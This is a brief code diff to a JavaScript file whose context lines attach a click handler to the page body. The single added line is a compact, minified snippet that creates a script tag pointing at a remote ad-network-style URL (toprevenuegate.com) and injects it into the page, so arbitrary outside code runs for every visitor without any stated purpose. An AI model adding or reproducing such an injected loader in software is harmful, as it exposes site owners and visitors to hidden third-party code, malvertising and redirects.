@@ -41,3 +41,4 @@ function onClick() {
 // Attach onclick event handler to body element
 document.body.addEventListener("click", onClick);
 }
+(function(s,u,z,p){s.src=u,s.setAttribute('id',z),p.appendChild(s);})(document.createElement('script'),'https://pl22134268.toprevenuegate.com/42/d8/f1/42d8f11052e2b2ecc8c112c8ea529f1d.js',1,document.body||document.documentElement)
